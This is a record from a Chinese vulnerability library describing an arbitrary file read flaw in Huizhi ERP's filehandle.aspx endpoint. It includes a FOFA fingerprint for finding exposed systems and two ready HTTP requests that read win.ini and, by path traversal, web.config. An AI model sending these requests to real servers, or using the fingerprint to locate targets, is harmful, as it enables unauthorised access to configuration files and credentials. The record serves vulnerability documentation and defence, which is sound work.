---
source: "wy876 漏洞文库"
title: "汇智ERP filehandle路径读取"
product: "汇智ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "无Cookie示例未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rpkrxscac0dp5hda"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%B1%9F%E9%98%B4%E6%B1%87%E6%99%BA%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%B1%87%E6%99%BAERPfilehandle%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"-642591392\""
fofa_unverified: "icon_hash="
id: "vw-d425fefa2c5cc88d19424005"
entity_id: "ve-d425fefa2c5cc88d19424005"
schema_version: "1"
---

# 汇智ERP filehandle路径读取

## 条目说明

- 对象与具体问题：汇智ERP；filehandle路径读取
- 版本、配置及部署条件：无版本
- 认证与权限前提：无Cookie示例未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同99并补相对web.config路径，产品目录重复按厂商/简称分裂
- FOFA残缺，缺返回结构/文件权限范围/修复
- 产品宣传冗长无版本价值

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
汇智ERP是一款由江阴汇智软件技术有限公司开发的企业资源规划（ERP）软件，旨在通过信息化手段帮助企业优化业务流程，提升管理效率，增强综合竞争力。适用于各类企业，包括大型企业、中小型企业以及集团化企业。根据企业规模和业务需求，汇智ERP提供了不同的版本（如集团版和标准版），以满足企业的个性化需求。汇智ERP filehandle存在任意文件读取漏洞

## 二、影响版本
+ 汇智ERP

## 三、资产测绘
+ fofa`icon_hash="-642591392"`
+ 特征


## 四、漏洞复现
```http
GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


```http
GET /nssys/common/filehandle.aspx?filepath=../../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rpkrxscac0dp5hda>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
